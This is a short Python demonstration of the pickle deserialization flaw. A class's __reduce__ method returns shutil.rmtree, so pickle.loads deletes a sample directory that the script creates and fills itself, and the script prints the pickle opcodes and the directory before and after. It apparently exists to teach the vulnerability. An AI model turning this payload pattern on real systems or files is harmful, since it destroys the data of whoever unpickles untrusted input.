import io
import os
import pickle
import pickletools
import shutil
from pathlib import Path

VICTIM = Path("tmp/victim_docs")


class RogueUnpick:
    """__reduce__ returns (callable, args). pickle.loads() unconditionally
    CALLS that callable with those args — that is the vulnerability."""

    def __reduce__(self):
        return (
            shutil.rmtree,
            (VICTIM,),
        )


def seed_victim_dir():
    if VICTIM.exists():
        shutil.rmtree(VICTIM)
    VICTIM.mkdir(parents=True)
    for name in ("thesis_draft.txt", "notes.md", "secret_key.pem"):
        (VICTIM / name).write_text(f"precious content of {name}\n")
    print(f"seeded {VICTIM}/ with:")
    for f in sorted(VICTIM.iterdir()):
        print(f"  - {f}")


def main():
    seed_victim_dir()

    payload = pickle.dumps(RogueUnpick())

    print("\n-- raw pickle stream --")
    buf = io.StringIO()
    pickletools.dis(payload, out=buf)
    print(buf.getvalue())

    print("victim dir before loads():")
    print("  ", list(VICTIM.iterdir()) if VICTIM.exists() else "MISSING")

    print("\n-> pickle.loads(payload)  ...")
    pickle.loads(payload)

    print("victim dir after  loads():")
    print("  ", list(VICTIM.iterdir()) if VICTIM.exists() else "MISSING (rmtree'd)")


if __name__ == "__main__":
    main()
